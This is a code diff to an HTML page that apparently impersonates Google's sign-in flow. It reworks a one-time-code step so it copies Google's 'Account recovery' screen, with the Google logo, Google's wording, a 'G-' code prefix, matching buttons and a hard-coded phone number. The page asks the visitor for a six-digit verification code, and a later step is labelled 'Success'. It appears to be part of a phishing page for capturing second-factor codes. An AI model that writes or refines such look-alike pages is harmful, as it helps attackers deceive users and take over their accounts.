@@ -133,8 +133,8 @@
 
             <!-- Step 3: OTP Verification -->
             <section class="auth-step" id="step3" data-step="3">
-                <div class="auth-content auth-content-vertical">
-                    <div class="auth-header-vertical">
+                <div class="auth-content">
+                    <div class="auth-left">
                         <div class="google-logo" aria-label="Google">
                             <svg viewBox="0 0 48 48" width="48" height="48" xmlns="http://www.w3.org/2000/svg"
                                 aria-hidden="true">
@@ -148,37 +148,46 @@
                                     d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z" />
                             </svg>
                         </div>
-                        <h1 class="auth-title">2-Step Verification</h1>
-                        <p class="auth-subtitle otp-subtitle">
-                            <span class="sms-icon">
-                                <svg width="24" height="24" viewBox="0 0 24 24" fill="none"
+                        <h1 class="auth-title">Account recovery</h1>
+                        <p class="auth-subtitle">To help keep your account safe, Google wants to make sure it's really
+                            you trying to sign in</p>
+                        <div class="user-chip" id="otpUserChip">
+                            <div class="user-avatar">
+                                <svg focusable="false" width="28" height="28" viewBox="0 0 24 24"
                                     xmlns="http://www.w3.org/2000/svg">
-                                    <path
-                                        d="M20 2H4C2.9 2 2.01 2.9 2.01 4L2 22L6 18H20C21.1 18 22 17.1 22 16V4C22 2.9 21.1 2 20 2ZM20 16H5.17L4.58 16.59L4 17.17V4H20V16ZM7 9H9V11H7V9ZM11 9H13V11H11V9ZM15 9H17V11H15V9Z"
-                                        fill="#5f6368" />
+                                    <path fill="#5f6368"
+                                        d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z">
+                                    </path>
                                 </svg>
-                            </span>
-                            A verification code was sent to your phone ending in <strong id="phoneNumber">**56</strong>
-                        </p>
+                            </div>
+                            <span class="user-email" id="otpDisplayEmail"></span>
+                            <svg class="dropdown-arrow" focusable="false" width="18" height="18" viewBox="0 0 24 24">
+                                <path fill="#5f6368" d="M7 10l5 5 5-5z"></path>
+                            </svg>
+                        </div>
+                        <a href="#" class="forgot-link resend-link" id="resendCode">Resend it</a>
                     </div>
-                    <div class="auth-form-vertical">
+                    <div class="auth-right">
+                        <p class="otp-message">A text message with a 6-digit verification code was just sent to <strong
+                                id="phoneNumber">079034 63322</strong></p>
                         <form id="otpForm" novalidate>
-                            <div class="input-container" id="otpContainer">
-                                <input type="text" id="otpInput" class="auth-input" placeholder=" " maxlength="6"
-                                    inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code"
-                                    aria-describedby="otpError">
-                                <label for="otpInput" class="input-label">Enter code</label>
+                            <div class="input-container otp-input-container" id="otpContainer">
+                                <span class="otp-prefix">G-</span>
+                                <input type="text" id="otpInput" class="auth-input otp-input-field"
+                                    placeholder="Enter the code" maxlength="6" inputmode="numeric" pattern="[0-9]*"
+                                    autocomplete="one-time-code" aria-describedby="otpError">
                                 <div class="input-error" id="otpError" role="alert" aria-live="polite"></div>
                             </div>
-                            <a href="#" class="forgot-link resend-link" id="resendCode">Resend code</a>
                             <div class="button-row">
-                                <button type="button" class="btn btn-text go-back-btn" data-go-to="2">Back</button>
-                                <button type="submit" class="btn btn-primary" id="otpConfirmBtn">Confirm</button>
+                                <button type="button" class="btn btn-text go-back-btn" data-go-to="2">Try another
+                                    way</button>
+                                <button type="submit" class="btn btn-primary" id="otpConfirmBtn">Next</button>
                             </div>
                         </form>
                     </div>
                 </div>
             </section>
+
 
             <!-- Step 4: Success -->
             <section class="auth-step" id="step4" data-step="4">
